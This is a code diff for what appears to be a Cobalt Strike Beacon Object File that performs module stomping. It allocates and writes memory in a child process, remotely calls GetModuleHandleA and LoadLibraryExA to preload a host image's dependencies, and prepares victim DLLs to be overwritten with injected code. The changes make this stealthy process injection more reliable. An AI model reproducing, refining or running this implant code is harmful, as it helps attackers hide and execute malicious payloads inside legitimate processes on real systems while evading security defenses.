@@ -13,6 +13,9 @@
 #ifndef DONT_RESOLVE_DLL_REFERENCES
 #define DONT_RESOLVE_DLL_REFERENCES 0x00000001
 #endif
+#ifndef LOAD_LIBRARY_SEARCH_SYSTEM32
+#define LOAD_LIBRARY_SEARCH_SYSTEM32 0x00000800
+#endif
 
 /*
  * Victim must be large enough for the host image and must NOT sit in the
@@ -28,11 +31,14 @@ static const char* PpfStompVictims[] = {
     NULL
 };
 
-/* Full paths — loaded with LoadLibraryEx after the process is initialized. */
+/*
+ * Short names + LOAD_LIBRARY_SEARCH_SYSTEM32 after warm-up.
+ * Load oleaut32 (pulls ole32/combase) — avoid a separate ole32 preload that
+ * was leaving the third LoadLibraryEx(OLEAUT32) failing.
+ */
 static const char* PpfStompHostDeps[] = {
-    "C:\\Windows\\System32\\msvcrt.dll",
-    "C:\\Windows\\System32\\ole32.dll",
-    "C:\\Windows\\System32\\OLEAUT32.dll",
+    "msvcrt.dll",
+    "oleaut32.dll",
     NULL
 };
 
@@ -642,8 +648,49 @@ static BOOL PpfStompWarmProcess(HANDLE hProcess, HANDLE hThread)
         return FALSE;
     }
     /* Let ntdll finish process/thread init while primary spins. */
-    KERNEL32$Sleep(150);
+    KERNEL32$Sleep(300);
     return TRUE;
+}
+
+static BOOL PpfStompRemoteGetModuleHandleA(
+    HANDLE hProcess,
+    const char* name,
+    ULONG_PTR* outBase)
+{
+    SIZE_T nameLen;
+    LPVOID remoteName = NULL;
+    ULONG_PTR pGetModuleHandleA;
+    BOOL ok = FALSE;
+
+    *outBase = 0;
+    pGetModuleHandleA = (ULONG_PTR)KERNEL32$GetProcAddress(
+        KERNEL32$GetModuleHandleA("kernel32.dll"),
+        "GetModuleHandleA");
+    if (!pGetModuleHandleA) {
+        return FALSE;
+    }
+
+    nameLen = MSVCRT$strlen(name) + 1;
+    remoteName = PpfStompRemoteAlloc(hProcess, nameLen, PAGE_READWRITE);
+    if (!remoteName || !PpfStompRemoteWrite(hProcess, remoteName, name, nameLen)) {
+        goto done;
+    }
+    if (!PpfStompRemoteCall2(
+            hProcess,
+            pGetModuleHandleA,
+            (ULONG_PTR)remoteName,
+            0,
+            outBase,
+            15000)) {
+        goto done;
+    }
+    ok = (*outBase != 0);
+
+done:
+    if (remoteName) {
+        KERNEL32$VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
+    }
+    return ok;
 }
 
 /* Map host deps in the child before the victim is stomped. */
@@ -652,15 +699,36 @@ static BOOL PpfStompPreloadDeps(HANDLE hProcess)
     int i;
     for (i = 0; PpfStompHostDeps[i] != NULL; i++) {
         ULONG_PTR base = 0;
-        /* flags=0: resolve imports + DllMain (process must be warmed first). */
+        const char* dep = PpfStompHostDeps[i];
+
+        if (PpfStompRemoteGetModuleHandleA(hProcess, dep, &base)) {
+            continue;
+        }
+
+        /* Prefer System32 search; full DllMain init (process must be warmed). */
         if (!PpfStompRemoteLoadLibraryExA(
-                hProcess, PpfStompHostDeps[i], 0, &base)) {
-            BeaconPrintf(
-                CALLBACK_ERROR,
-                "[!] stomp: preload %s failed (err=%lu)",
-                PpfStompHostDeps[i],
-                KERNEL32$GetLastError());
-            return FALSE;
+                hProcess, dep, LOAD_LIBRARY_SEARCH_SYSTEM32, &base)) {
+            /* Retry with plain flags=0 (some builds ignore SEARCH_*). */
+            if (!PpfStompRemoteLoadLibraryExA(hProcess, dep, 0, &base)) {
+                BeaconPrintf(
+                    CALLBACK_ERROR,
+                    "[!] stomp: preload %s failed",
+                    dep);
+                return FALSE;
+            }
+        }
+    }
+
+    /* Host also imports ole32 — ensure it is mapped (usually via oleaut32). */
+    {
+        ULONG_PTR ole = 0;
+        if (!PpfStompRemoteGetModuleHandleA(hProcess, "ole32.dll", &ole)) {
+            if (!PpfStompRemoteLoadLibraryExA(
+                    hProcess, "ole32.dll", LOAD_LIBRARY_SEARCH_SYSTEM32, &ole) &&
+                !PpfStompRemoteLoadLibraryExA(hProcess, "ole32.dll", 0, &ole)) {
+                BeaconPrintf(CALLBACK_ERROR, "[!] stomp: preload ole32.dll failed");
+                return FALSE;
+            }
         }
     }
     return TRUE;
